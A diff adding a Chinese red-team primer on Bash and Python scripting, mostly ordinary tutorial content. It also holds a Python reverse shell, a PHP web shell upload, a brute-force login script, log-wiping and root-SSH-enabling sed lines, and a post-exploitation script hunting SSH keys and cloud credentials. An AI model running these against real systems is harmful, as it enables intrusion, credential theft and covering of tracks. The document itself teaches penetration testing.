@@ -1,0 +1,1049 @@
+================================================================================
+                          编程基础
+            网安基础知识系列 · 红队入门必读
+================================================================================
+
+【目录】
+  第一部分：Bash脚本基础
+    一、Bash概述
+    二、变量与数据类型
+    三、条件判断与流程控制
+    四、循环结构
+    五、函数
+    六、常用命令详解
+    七、Bash脚本示例
+  第二部分：Python安全编程基础
+    八、Python概述
+    九、数据类型与控制流
+    十、文件IO操作
+    十一、网络编程
+    十二、进程与系统操作
+    十三、正则表达式
+    十四、Python代码示例
+  第三部分：综合实践示例
+  第四部分：红队视角总结
+
+================================================================================
+                第一部分：Bash脚本基础
+================================================================================
+
+一、Bash概述
+================================================================================
+
+Bash (Bourne Again SHell) 是Linux/Unix系统的默认命令行解释器。
+
+红队为什么学Bash？
+  1. 目标是Linux服务器时，Bash是你唯一的工具
+  2. 反弹Shell多数是Bash Shell
+  3. 能快速编写自动化脚本(批量扫描、信息收集、漏洞利用)
+  4. 利用受限制Shell(受限bash绕过)
+  5. 目标机器上几乎必定存在Bash
+
+Bash脚本基础结构：
+  #!/bin/bash
+  # 脚本说明
+  set -e          # 遇到错误立即退出(推荐)
+  set -u          # 使用未定义变量时报错
+  # 脚本主体
+  echo "Hello World"
+
+================================================================================
+二、变量与数据类型
+================================================================================
+
+【变量定义和使用】
+  # 定义变量(注意=两边不能有空格!)
+  name="value"
+  number=42
+
+  # 使用变量(用$引用)
+  echo $name
+  echo "Hello ${name}"     # 花括号指定变量边界
+
+  # 特殊变量
+  $0          # 脚本名称
+  $1 $2 ...   # 第N个参数
+  $#          # 参数个数
+  $@ / $*     # 所有参数(推荐$@)
+  $?          # 上一条命令的退出码(0=成功)
+  $$          # 当前进程PID
+  $!          # 最后一个后台进程PID
+
+【字符串操作】
+  str="Hello World"
+  echo ${#str}              # 字符串长度: 11
+  echo ${str:0:5}           # 子串: Hello
+  echo ${str/World/Bash}    # 替换: Hello Bash
+  echo ${str,,}             # 转小写: hello world
+  echo ${str^^}             # 转大写: HELLO WORLD
+
+【数组】
+  arr=(one two three four)
+  echo ${arr[0]}            # one
+  echo ${arr[@]}            # 所有元素: one two three four
+  echo ${#arr[@]}           # 数组长度: 4
+  arr+=("five")             # 追加元素
+  for item in "${arr[@]}"; do echo $item; done
+
+【命令替换】
+  now=$(date +%Y-%m-%d)
+  files=$(ls /etc/*.conf 2>/dev/null)
+  # 或使用反引号(旧式，不推荐)：files=`ls`
+
+================================================================================
+三、条件判断与流程控制
+================================================================================
+
+【test / [ 条件表达式】
+  # 数值比较
+  [ $a -eq $b ]     # 等于 (equal)
+  [ $a -ne $b ]     # 不等于 (not equal)
+  [ $a -gt $b ]     # 大于 (greater than)
+  [ $a -lt $b ]     # 小于 (less than)
+  [ $a -ge $b ]     # 大于等于
+  [ $a -le $b ]     # 小于等于
+
+  # 字符串比较
+  [ "$str1" = "$str2" ]      # 相等
+  [ "$str1" != "$str2" ]     # 不等
+  [ -z "$str" ]              # 字符串为空(长度为0)
+  [ -n "$str" ]              # 字符串非空
+  [[ $str =~ ^[0-9]+$ ]]     # 正则匹配(需要双括号)
+
+  # 文件测试(非常重要!)
+  [ -f file ]       # 是否为普通文件
+  [ -d dir ]        # 是否为目录
+  [ -e path ]       # 是否存在(文件或目录)
+  [ -x file ]       # 是否可执行
+  [ -r file ]       # 是否可读
+  [ -w file ]       # 是否可写
+  [ -s file ]       # 文件非空(大小>0)
+  [ -L file ]       # 是否为符号链接
+
+  # 逻辑组合
+  [ cond1 -a cond2 ]   # AND (与)，推荐用 [ cond1 ] && [ cond2 ]
+  [ cond1 -o cond2 ]   # OR (或)，推荐用 [ cond1 ] || [ cond2 ]
+  [ ! cond ]           # NOT (非)
+
+【if-elif-else 分支】
+  if [ -f /etc/passwd ]; then
+      echo "passwd文件存在"
+  elif [ -f /etc/shadow ]; then
+      echo "shadow文件存在"
+  else
+      echo "都不存在"
+  fi
+
+【case 分支(模式匹配)】
+  case $1 in
+      start)
+          echo "Starting..."
+          ;;
+      stop)
+          echo "Stopping..."
+          ;;
+      restart|reload)
+          echo "Restarting..."
+          ;;
+      *)
+          echo "Usage: $0 {start|stop|restart}"
+          exit 1
+          ;;
+  esac
+
+================================================================================
+四、循环结构
+================================================================================
+
+【for 循环】
+  # 遍历列表
+  for port in 22 80 443 3306; do
+      echo "Scanning port $port..."
+      nc -zv 192.168.1.1 $port
+  done
+
+  # C风格for
+  for ((i=1; i<=10; i++)); do
+      echo "Number: $i"
+  done
+
+  # 遍历命令输出
+  for user in $(cat /etc/passwd | cut -d: -f1); do
+      echo "User: $user"
+  done
+
+  # 遍历文件
+  for file in /tmp/*.txt; do
+      [ -f "$file" ] || continue
+      echo "Processing $file"
+  done
+
+【while 循环】
+  count=1
+  while [ $count -le 10 ]; do
+      echo $count
+      ((count++))
+  done
+
+  # 读文件逐行处理
+  while IFS= read -r line; do
+      echo "Line: $line"
+  done < /etc/passwd
+
+  # 无限循环
+  while true; do
+      nc -zv 192.168.1.1 80
+      sleep 60
+  done
+
+【until 循环（条件为假时执行）】
+  until [ -f /tmp/flag ]; do
+      echo "Waiting for flag file..."
+      sleep 5
+  done
+
+【循环控制】
+  break               # 跳出循环
+  continue            # 跳过本次循环剩余代码，继续下一次
+  break 2             # 跳出两层循环
+
+================================================================================
+五、函数
+================================================================================
+
+【函数定义和调用】
+  function greet {
+      local name=$1          # local限制作用域
+      echo "Hello, $name!"
+  }
+  # 调用
+  greet "Alice"
+
+【带返回值的函数】
+  # 通过echo返回(常用)
+  get_user_count() {
+      cat /etc/passwd | wc -l
+  }
+  count=$(get_user_count)
+  echo "User count: $count"
+
+  # 通过return返回(只能0-255)
+  check_root() {
+      [ $UID -eq 0 ] && return 0 || return 1
+  }
+  if check_root; then
+      echo "Running as root"
+  fi
+
+【常用函数模板】
+  # 错误处理
+  die() {
+      echo "[!] ERROR: $*" >&2
+      exit 1
+  }
+
+  # 日志输出
+  log() {
+      echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
+  }
+
+  # 用法示例
+  if [ $# -lt 2 ]; then
+      die "Usage: $0 <target> <port>"
+  fi
+  log "Starting scan on $1:$2"
+
+================================================================================
+六、常用命令详解（红队视角）
+================================================================================
+
+【grep - 文本搜索】
+  grep "root" /etc/passwd                    # 基本搜索
+  grep -i "error" log.txt                    # 不区分大小写(-i)
+  grep -r "password" /etc/ 2>/dev/null       # 递归搜索(-r)
+  grep -v "#" config.conf                    # 反向选择(排除注释行)
+  grep -E "(pass|secret)" file               # 扩展正则(-E)
+  grep -A 3 "error" log.txt                  # 显示匹配行及后3行
+  grep -B 3 "error" log.txt                  # 显示匹配行及前3行
+  grep -l "vulnerable" *.log                 # 只显示含匹配的文件名
+  grep -c "404" access.log                   # 统计匹配行数
+  grep -oP 'password=\K[^&]*' url.txt       # Perl正则提取密码值
+
+  红队常用:
+    grep -r "DB_PASSWORD" /var/www/           # 找数据库密码
+    grep -r "jdbc:" /opt/                     # 找JDBC连接串
+    grep -E "(authorized_keys|id_rsa)" /home/ # 找SSH密钥
+    grep -r "INSERT INTO" /opt/ --include="*.log"  # 找SQL日志中的敏感信息
+
+【awk - 文本处理/列操作】
+  # 基本语法: awk 'pattern { action }' file
+
+  # 打印特定列(默认空格/TAB分隔)
+  awk '{print $1}' /etc/passwd              # 打印第1列
+  awk '{print $1, $3}' /etc/passwd          # 打印第1和第3列
+
+  # 自定义分隔符
+  awk -F: '{print $1, $7}' /etc/passwd      # 冒号分隔,打印用户名和Shell
+  awk -F: '/\/bin\/bash/{print $1}' /etc/passwd  # 所有bash用户
+
+  # 变量和运算
+  awk '{sum+=$3} END {print sum}' data.txt  # 求和
+  awk '{print NR, $0}' file                 # 打印行号(NR)
+
+  红队常用:
+    awk -F: '$3==0{print $1}' /etc/passwd          # UID=0的用户
+    awk -F: '$3>=1000{print $1}' /etc/passwd       # 普通用户
+    grep "Accepted" /var/log/auth.log | awk '{print $(NF-3)}' | sort -u  # 成功登录的IP
+    netstat -ant | awk '/^tcp/{print $5}' | cut -d: -f1 | sort -u        # 连接过的IP
+
+【sed - 流编辑器（文本修改）】
+  # 替换
+  sed 's/old/new/' file               # 替换每行第一个匹配
+  sed 's/old/new/g' file              # 全局替换
+  sed 's/old/new/2' file              # 替换每行第二个匹配
+  sed 's/old/new/gi' file             # 全局+忽略大小写
+
+  # 删除
+  sed '/pattern/d' file               # 删除匹配行
+  sed '2,5d' file                     # 删除第2-5行
+  sed '/^$/d' file                    # 删除空行
+  sed '/^#/d' file                    # 删除注释行
+
+  # 原地修改
+  sed -i 's/old/new/g' file           # 直接修改文件(危险!)
+  sed -i.bak 's/old/new/g' file       # 修改前备份
+
+  红队常用:
+    sed -i '/192.168.1.5/d' /var/log/auth.log  # 从日志删除特定IP的行
+    sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+【cut - 按列提取】
+  cut -d: -f1,7 /etc/passwd                  # 冒号分隔,第1和7列
+  cut -d: -f1-3 /etc/passwd                  # 第1到3列
+  cut -c1-5 file                             # 每行第1-5个字符
+  cut -d, -f2 --complement file              # 除了第2列以外的所有列
+
+【sort - 排序】
+  sort file                        # 按字母排序
+  sort -n file                     # 按数值排序
+  sort -u file                     # 去重排序
+  sort -r file                     # 反序
+  sort -t: -k3 -n /etc/passwd      # 冒号分隔,按第3列数值排序
+  du -sh /var/* | sort -hr         # 按大小排序目录(最常用的内网信息收集方式)
+
+【uniq - 去重和统计】
+  sort file | uniq                 # 去重(需要先sort!)
+  sort file | uniq -c              # 统计出现次数
+  sort file | uniq -d              # 只显示重复行
+  sort file | uniq -u              # 只显示不重复行
+
+【wc - 计数】
+  wc -l file           # 行数
+  wc -w file           # 单词数
+  wc -c file           # 字节数
+  ps aux | wc -l       # 统计进程数(用于信息收集)
+
+【find - 查找文件（核心工具）】
+  find / -name "*.conf" -type f 2>/dev/null        # 按名字找配置文件
+  find / -perm -4000 -type f 2>/dev/null           # 找SUID文件
+  find / -writable -type d 2>/dev/null             # 找可写目录
+  find / -user root -perm -4000 2>/dev/null        # root的SUID文件
+  find / -name "flag*" -exec cat {} \; 2>/dev/null # 找flag文件并查看
+  find / -mtime -1 -type f 2>/dev/null             # 最近1天修改的文件
+
+【xargs - 将标准输入转换为命令参数】
+  find / -name "*.log" -type f | xargs grep "error"   # 批量搜索日志
+  cat urls.txt | xargs -I {} curl -s -o /dev/null -w "%{http_code}" {}  # 批量访问URL
+  # 注意：文件名有空格时用 find -print0 | xargs -0
+
+================================================================================
+七、Bash脚本示例
+================================================================================
+
+【示例1：批量Ping扫描】
+  #!/bin/bash
+  # 扫描192.168.1.0/24存活主机
+  SUBNET="192.168.1"
+  for ip in $(seq 1 254); do
+      ping -c 1 -W 1 ${SUBNET}.${ip} > /dev/null 2>&1
+      if [ $? -eq 0 ]; then
+          echo "[+] Host alive: ${SUBNET}.${ip}"
+      fi
+  done
+
+【示例2：日志分析 - 找出所有攻击IP】
+  #!/bin/bash
+  LOGFILE="/var/log/auth.log"
+  echo "=== Failed SSH Attempts ==="
+  grep "Failed password" $LOGFILE | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
+
+  echo ""
+  echo "=== Successful Logins ==="
+  grep "Accepted" $LOGFILE | awk '{print $(NF-3)}' | sort -u
+
+【示例3：自动化信息收集脚本（后渗透）】
+  #!/bin/bash
+  # Linux后渗透信息收集快速脚本
+  echo "=== System Info ==="
+  uname -a; cat /etc/os-release 2>/dev/null; hostname
+
+  echo -e "\n=== Users ==="
+  grep -v nobody /etc/passwd | awk -F: '$3>=1000 || $3==0{print $1}'
+
+  echo -e "\n=== Network ==="
+  ip a | grep "inet "; netstat -tlnp 2>/dev/null | grep LISTEN
+
+  echo -e "\n=== Interesting Files ==="
+  find / -name "*.conf" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null | head -20
+
+  echo -e "\n=== History ==="
+  cat ~/.bash_history 2>/dev/null | tail -20
+
+【示例4：密码字典生成器】
+  #!/bin/bash
+  # 根据公司信息生成密码字典
+  COMPANY="acme"
+  YEAR=$(date +%Y)
+  echo "${COMPANY}@${YEAR}"
+  echo "${COMPANY}${YEAR}"
+  echo "${COMPANY}123"
+  echo "${COMPANY}2024"
+  for i in {0..9}; do echo "${COMPANY}${i}${i}${i}"; done
+  for i in {1..12}; do printf "${COMPANY}%02d\n" $i; done
+
+================================================================================
+                第二部分：Python安全编程基础
+================================================================================
+
+八、Python概述
+================================================================================
+
+Python是网络安全领域最重要的编程语言之一。
+
+红队为什么学Python？
+  1. 快速开发漏洞利用(Exploit)脚本
+  2. 大量安全库(scapy, impacket, pwntools, paramiko, requests)
+  3. C2框架的插件/模块开发
+  4. 数据处理和分析(日志分析、破解结果处理)
+  5. 几乎所有渗透测试工具都提供Python API
+
+与Bash的比较：
+  Bash:  系统操作、管道、快速一行命令、Linux原生
+  Python: 复杂逻辑、网络编程、加密/编码、跨平台
+
+================================================================================
+九、数据类型与控制流
+================================================================================
+
+【基本数据类型】
+  # 数字
+  a = 42; b = 3.14; c = 0xFF  # 十六进制
+
+  # 字符串
+  s = "Hello World"
+  s2 = f"Hello {name}"        # f-string(Python 3.6+)
+  s3 = 'Hello "World"'        # 单双引号同级
+  s = "line1\nline2"          # 转义字符
+  s = r"C:\Windows\System32"  # raw string(不转义)
+
+  # 布尔值
+  flag = True  # 注意大写
+  flag = False
+
+  # None(空值)
+  result = None
+
+【字符串操作】
+  s = "Hello World"
+  len(s)               # 11
+  s.upper()             # "HELLO WORLD"
+  s.lower()             # "hello world"
+  s.split(" ")          # ["Hello", "World"]
+  " ".join(["A","B"])   # "A B"
+  s.replace("World", "Python")   # 替换
+  s.find("World")       # 7 (找不到返回-1)
+  s.startswith("H")     # True
+  s.endswith("d")       # True
+  "192.168.1.1".split(".")  # ['192', '168', '1', '1']
+  s[0:5]                # 切片: "Hello"
+
+【列表 (List)】
+  items = [1, 2, 3, 4]
+  items.append(5)       # 追加: [1,2,3,4,5]
+  items.extend([6,7])   # 扩展: [1,2,3,4,5,6,7]
+  items.insert(0, 0)    # 指定位置插入
+  items.remove(3)       # 按值删除
+  item = items.pop()    # 弹出最后一个
+  items[0] = 99         # 修改
+  items.sort()          # 排序
+  if 5 in items: ...    # 判断是否存在
+  for item in items:
+      print(item)
+
+  # 列表推导式(非常实用!)
+  ports = [p for p in range(1, 1025)]
+  squares = [x**2 for x in range(10)]
+  evens = [x for x in range(100) if x % 2 == 0]
+
+【字典 (Dictionary)】
+  user = {"name": "alice", "uid": 1000, "shell": "/bin/bash"}
+  user["name"]            # "alice"
+  user.get("key", "default")  # 取不到返回默认值
+  user["groups"] = ["sudo", "docker"]  # 添加/修改
+  del user["shell"]       # 删除键
+  for k, v in user.items():
+      print(f"{k}: {v}")
+
+  # 字典推导式
+  users = {line.split(":")[0]: line.split(":")[2] for line in open("/etc/passwd")}
+
+【元组 (Tuple) - 不可变列表】
+  point = (10, 20)
+  x, y = point           # 解包
+
+【集合 (Set) - 去重】
+  unique_ports = set([80, 80, 443, 8080])  # {80, 443, 8080}
+  a = {1,2,3}; b = {2,3,4}
+  a | b  # 并集 {1,2,3,4}
+  a & b  # 交集 {2,3}
+  a - b  # 差集 {1}
+
+【条件判断】
+  if condition:
+      pass
+  elif condition2:
+      pass
+  else:
+      pass
+
+  # 三元表达式
+  shell = "/bin/bash" if is_admin else "/bin/nologin"
+
+【循环】
+  # for循环
+  for i in range(1, 11):
+      print(i)
+
+  for port in [21, 22, 80, 443]:
+      print(f"Scanning port {port}")
+
+  for line in open("/etc/passwd"):
+      print(line.strip())
+
+  # while循环
+  count = 0
+  while count < 10:
+      print(count)
+      count += 1
+
+【异常处理】
+  try:
+      result = 10 / 0
+  except ZeroDivisionError as e:
+      print(f"Error: {e}")
+  except Exception as e:
+      print(f"Unexpected: {e}")
+  else:
+      print("No error occurred")
+  finally:
+      print("Always executed")
+
+【函数定义】
+  def scan_port(host, port, timeout=1):
+      """
+      Scan a single TCP port.
+      Returns True if open, False if closed.
+      """
+      import socket
+      s = socket.socket()
+      s.settimeout(timeout)
+      result = s.connect_ex((host, port))
+      s.close()
+      return result == 0
+
+  # 调用
+  if scan_port("192.168.1.1", 80):
+      print("Port 80 is open!")
+
+================================================================================
+十、文件IO操作
+================================================================================
+
+【读取文件】
+  # 读取整个文件
+  with open("/etc/passwd", "r") as f:
+      content = f.read()
+
+  # 逐行读取
+  with open("/etc/passwd", "r") as f:
+      for line in f:
+          username = line.split(":")[0]
+          print(username)
+
+  # 读取所有行到列表
+  with open("/etc/passwd", "r") as f:
+      lines = f.readlines()
+
+【写入文件】
+  # 覆盖写入
+  with open("/tmp/output.txt", "w") as f:
+      f.write("Hello World\n")
+      f.write("Line 2\n")
+
+  # 追加写入
+  with open("/tmp/log.txt", "a") as f:
+      f.write(f"[{datetime.now()}] New entry\n")
+
+【文件模式】
+  "r"   - 只读(默认，文件必须存在)
+  "w"   - 只写(覆盖，不存在则创建)
+  "a"   - 追加(文件尾写入)
+  "x"   - 创建新文件(文件已存在则失败)
+  "rb"  - 二进制读
+  "wb"  - 二进制写
+  "r+"  - 读写
+
+【文件路径操作 (os/os.path)】
+  import os
+
+  os.path.exists("/etc/passwd")    # 是否存在
+  os.path.isfile("/etc/passwd")    # 是否是文件
+  os.path.isdir("/tmp")            # 是否是目录
+  os.path.getsize("/etc/passwd")   # 文件大小
+  os.path.join("/etc", "passwd")   # 路径拼接: /etc/passwd
+  os.path.basename("/etc/passwd")  # 文件名: passwd
+  os.path.dirname("/etc/passwd")   # 目录名: /etc
+
+  os.listdir("/tmp")               # 列出目录内容
+  os.mkdir("/tmp/newdir")          # 创建目录
+  os.makedirs("/tmp/a/b/c", exist_ok=True)  # 递归创建
+  os.remove("/tmp/file.txt")       # 删除文件
+  os.chmod("/tmp/test", 0o755)     # 修改权限(注意八进制前缀0o)
+
+【读取二进制文件 (后门/Shellcode)】
+  with open("shellcode.bin", "rb") as f:
+      shellcode = f.read()
+  print(shellcode.hex())            # 转为十六进制字符串
+  print(shellcode.hex()[:50] + "...")
+
+================================================================================
+十一、网络编程
+================================================================================
+
+【socket 原生编程】
+  import socket
+
+  # TCP客户端
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.settimeout(3)
+  try:
+      s.connect(("192.168.1.1", 80))
+      s.send(b"GET / HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n")
+      response = s.recv(4096)
+      print(response.decode())
+  except socket.timeout:
+      print("Connection timed out")
+  finally:
+      s.close()
+
+  # TCP服务端(监听)
+  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  server.bind(("0.0.0.0", 4444))
+  server.listen(1)
+  print("Listening on port 4444...")
+  client, addr = server.accept()
+  print(f"Connection from {addr}")
+  client.send(b"Hello from server!\n")
+  client.close()
+
+  # UDP
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  s.sendto(b"test", ("192.168.1.1", 53))
+  data, addr = s.recvfrom(1024)
+
+【requests 库 (HTTP请求) - 必学！】
+
+  import requests
+
+  # GET请求
+  r = requests.get("https://httpbin.org/get", params={"key": "value"})
+  print(r.status_code)
+  print(r.text)
+  print(r.json())
+
+  # POST请求
+  r = requests.post("https://httpbin.org/post",
+                    data={"username": "admin", "password": "123456"})
+
+  # JSON POST
+  r = requests.post("https://httpbin.org/post",
+                    json={"user": "admin"})
+
+  # 自定义头部
+  headers = {
+      "User-Agent": "Mozilla/5.0 (Custom Red Team UA)",
+      "X-Forwarded-For": "127.0.0.1"
+  }
+  r = requests.get("https://target.com", headers=headers)
+
+  # 会话保持(Cookie自动管理)
+  s = requests.Session()
+  s.get("https://target.com/login")
+  s.post("https://target.com/login", data={"user": "admin", "pass": "admin"})
+  s.get("https://target.com/admin")  # 自动带Cookie
+
+  # 代理
+  proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+  r = requests.get("https://target.com", proxies=proxies, verify=False)
+
+  # SSL跳过验证(测试用)
+  import urllib3
+  urllib3.disable_warnings()
+  r = requests.get("https://target.com", verify=False)
+
+  # 文件上传
+  files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")}
+  r = requests.post("https://target.com/upload", files=files)
+
+  # 超时设置
+  r = requests.get("https://target.com", timeout=5)
+
+  # 查看请求的历史(重定向追踪)
+  print(r.history)
+  print(r.url)  # 最终URL
+
+================================================================================
+十二、进程与系统操作
+================================================================================
+
+【subprocess 模块 - 执行系统命令】
+
+  import subprocess
+
+  # 执行命令并获取输出
+  result = subprocess.run(["ls", "-la"], capture_output=True, text=True)
+  print(result.stdout)
+  print(result.returncode)
+
+  # 执行shell命令(不推荐，有注入风险)
+  # 但在渗透测试工具中常用
+  result = subprocess.getoutput("id")
+  print(result)
+
+  # 管道操作
+  p1 = subprocess.run(["cat", "/etc/passwd"], capture_output=True, text=True)
+  p2 = subprocess.run(["grep", "root"], input=p1.stdout, capture_output=True, text=True)
+  print(p2.stdout)
+
+  # Popen - 更灵活的控制
+  proc = subprocess.Popen(["/bin/bash"],
+                         stdin=subprocess.PIPE,
+                         stdout=subprocess.PIPE,
+                         stderr=subprocess.PIPE)
+  proc.stdin.write(b"id\n")
+  proc.stdin.flush()
+  output = proc.stdout.readline()
+  print(output.decode())
+
+【os 模块 - 系统操作】
+
+  import os
+
+  os.system("id")                  # 执行命令(最简单，不推荐)
+  os.getuid()                      # 当前用户UID
+  os.geteuid()                     # 有效UID(SUID情况下)
+  os.getcwd()                      # 当前工作目录
+  os.environ.get("HOME")           # 环境变量
+  os.listdir("/tmp")               # 列出目录
+
+【pty 模块 - 伪终端(升级Shell)】
+  import pty
+  pty.spawn("/bin/bash")     # 获取完整的交互式Shell
+
+================================================================================
+十三、正则表达式 (re 模块)
+================================================================================
+
+正则表达式是文本处理的瑞士军刀，红队每天都要用。
+
+【基本语法速查】
+  .      任意字符(除换行)
+  \d     数字 [0-9]
+  \w     单词字符 [a-zA-Z0-9_]
+  \s     空白字符(空格、Tab、换行)
+  \D     非数字
+  \W     非单词字符
+  \S     非空白
+  ^      行首
+  $      行尾
+  *      0次或多次
+  +      1次或多次
+  ?      0次或1次
+  {n}    精确n次
+  {n,}   至少n次
+  {n,m}  n到m次
+  []     字符类 [a-z] [A-Z] [0-9]
+  [^]    否定字符类 [^0-9] 非数字
+  |      或 (red|blue)
+  ()     捕获组
+  (?:)   非捕获组
+  (?P<name>) 命名捕获组
+
+【Python re 模块基本用法】
+
+  import re
+
+  # re.search - 搜索第一个匹配
+  match = re.search(r"admin:\d{3}", text)
+  if match:
+      print(match.group())   # 完整匹配
+      print(match.start())   # 起始位置
+
+  # re.findall - 查找所有匹配
+  ips = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", log_content)
+
+  # re.finditer - 返回迭代器(高效)
+  for m in re.finditer(r"error", log):
+      print(m.start(), m.group())
+
+  # re.sub - 替换
+  cleaned = re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "[REDACTED]", log)
+
+  # re.split - 分割
+  parts = re.split(r"[,\s]+", "a,b c  d,,e")
+
+  # 捕获组
+  pattern = r"user=(\w+)&pass=(\w+)"
+  match = re.search(pattern, "user=admin&pass=123456")
+  if match:
+      print(match.group(1))  # admin
+      print(match.group(2))  # 123456
+
+  # 编译正则(重复使用时提高效率)
+  ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+  ips = ip_pattern.findall(log_content)
+
+【红队常用正则示例】
+
+  # 提取IP地址
+  re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", text)
+
+  # 提取URL
+  re.findall(r"https?://[\w./]+", text)
+
+  # 提取邮箱
+  re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", text)
+
+  # 提取密码(从配置文件)
+  re.findall(r"(?:password|passwd|pass|pwd)\s*[=:]\s*['\"]?([^'\"\s]+)", text, re.I)
+
+  # 提取CSRF Token
+  re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
+
+  # 验证哈希格式
+  re.match(r"^[a-fA-F0-9]{32}$", hash_str)   # MD5
+  re.match(r"^[a-fA-F0-9]{64}$", hash_str)   # SHA256
+
+  # 提取JWT Token
+  re.findall(r"eyJ[\w-]+\.[\w-]+\.[\w-]+", text)
+
+================================================================================
+十四、Python代码示例
+================================================================================
+
+【示例1：简单端口扫描器】
+
+  import socket
+  import sys
+  from concurrent.futures import ThreadPoolExecutor
+
+  def scan_port(host, port):
+      """扫描单个端口，返回(port, is_open)"""
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.settimeout(1)
+      result = s.connect_ex((host, port))
+      s.close()
+      return (port, result == 0)
+
+  def scan_host(host, ports=None, max_threads=100):
+      """扫描主机上的端口列表"""
+      if ports is None:
+          ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
+                   443, 445, 993, 995, 1433, 1521, 3306, 3389,
+                   5432, 5900, 6379, 8080, 8443, 27017]
+
+      open_ports = []
+      with ThreadPoolExecutor(max_workers=max_threads) as executor:
+          futures = {executor.submit(scan_port, host, p): p for p in ports}
+          for future in futures:
+              port, is_open = future.result()
+              if is_open:
+                  open_ports.append(port)
+      return sorted(open_ports)
+
+  if __name__ == "__main__":
+      if len(sys.argv) < 2:
+          print(f"Usage: {sys.argv[0]} <host>")
+          sys.exit(1)
+
+      host = sys.argv[1]
+      print(f"Scanning {host}...")
+      open_ports = scan_host(host)
+      for port in open_ports:
+          print(f"[+] Port {port} is OPEN")
+
+【示例2：HTTP暴力破解登录】
+
+  import requests
+
+  def brute_login(url, username, password_file):
+      """尝试字典中的密码进行登录"""
+      with open(password_file, "r") as f:
+          for password in f:
+              password = password.strip()
+              r = requests.post(url, data={
+                  "username": username,
+                  "password": password
+              })
+
+              if "Login failed" not in r.text:
+                  print(f"[+] Found! {username}:{password}")
+                  return password
+
+              print(f"[-] Failed: {password}")
+      return None
+
+  # brute_login("https://target.com/login", "admin", "/usr/share/wordlists/rockyou.txt")
+
+【示例3：Python反弹Shell（客户端）】
+
+  import socket
+  import subprocess
+  import os
+
+  def reverse_shell(host, port):
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((host, port))
+      os.dup2(s.fileno(), 0)   # stdin
+      os.dup2(s.fileno(), 1)   # stdout
+      os.dup2(s.fileno(), 2)   # stderr
+      subprocess.call(["/bin/sh", "-i"])
+
+  # reverse_shell("10.0.0.1", 4444)
+
+【示例4：Bash批量HTTP探测】
+
+  #!/bin/bash
+  # 从文件中读取URL列表并批量探测
+
+  URLFILE="urls.txt"
+  while IFS= read -r url; do
+      code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url")
+      echo "$url -> HTTP $code"
+  done < "$URLFILE"
+
+【示例5：从HTML中提取所有链接】
+
+  import re
+  import requests
+
+  url = "https://example.com"
+  html = requests.get(url).text
+  links = re.findall(r'href="([^"]+)"', html)
+  for link in links:
+      print(link)
+
+================================================================================
+                第三部分：综合实践示例
+================================================================================
+
+【实战：全自动化信息收集脚本(Python)】
+
+  #!/usr/bin/env python3
+  """Linux后渗透自动化信息收集"""
+
+  import os
+  import subprocess
+  import socket
+  import json
+
+  def collect_all():
+      info = {}
+
+      # 系统信息
+      info["hostname"] = socket.gethostname()
+      info["kernel"] = os.popen("uname -a").read().strip()
+      info["os"] = os.popen("cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null").read().strip()
+
+      # 用户信息
+      info["current_user"] = os.popen("id").read().strip()
+      info["other_users"] = os.popen("who").read().strip().split("\n")
+      info["sudoers"] = os.popen("sudo -l 2>/dev/null").read().strip()
+
+      # 网络信息
+      info["interfaces"] = os.popen("ip a | grep 'inet '").read().strip()
+      info["listen_ports"] = os.popen("ss -tlnp 2>/dev/null").read().strip()
+
+      # SUID文件
+      info["suid_files"] = os.popen("find / -perm -4000 -type f 2>/dev/null").read().strip().split("\n")[:20]
+
+      # 敏感文件探测
+      sensitive = [".bash_history", ".ssh/id_rsa", ".ssh/authorized_keys",
+                   ".aws/credentials", ".gitconfig"]
+      info["sensitive_files"] = []
+      for home in os.popen("ls -d /home/* 2>/dev/null").read().strip().split():
+          for sf in sensitive:
+              path = os.path.join(home, sf)
+              if os.path.exists(path):
+                  info["sensitive_files"].append(path)
+
+      return info
+
+  if __name__ == "__main__":
+      data = collect_all()
+      print(json.dumps(data, indent=2))
+      with open("/tmp/linenum_results.json", "w") as f:
+          json.dump(data, f, indent=2)
+      print("\n[+] Results saved to /tmp/linenum_results.json")
+
+================================================================================
+                第四部分：红队视角总结
+================================================================================
+
+红队必须掌握的编程技能：
+
+  Bash (必须精通):
+    - 反弹Shell的各种变体
+    - 一键信息收集脚本(可在目标机器直接运行)
+    - 文本处理管道(grep/sed/awk/cut/sort/uniq)
+    - 网络操作(scp/curl/nc/dev/tcp)
+    - find和正则结合使用
+
+  Python (必须熟练):
+    - requests库发送各种HTTP请求(POST/文件上传/认证)
+    - socket编程(端口扫描/数据发送)
+    - subprocess执行系统命令
+    - re正则处理日志和HTML
+    - 多线程加速扫描(ThreadPoolExecutor)
+
+  PowerShell (Windows环境必备):
+    - 基本cmdlet操作
+    - 脚本执行策略绕过
+    - 无文件攻击(PowerShell反射加载)
+    - 进程/服务管理
+
+学习建议：
+  1. 先用Bash完成所有日常操作(不用GUI)
+  2. 每天写一个Python小脚本(哪怕只有20行)
+  3. 练习读源代码(理解别人写的工具)
+  4. 在渗透测试场景中自己编写小工具而非直接使用现成工具
+  5. 参与CTF比赛练习编程能力
+
+推荐工具和资源：
+  在线练习: OverTheWire Bandit (Bash), PicoCTF (Python)
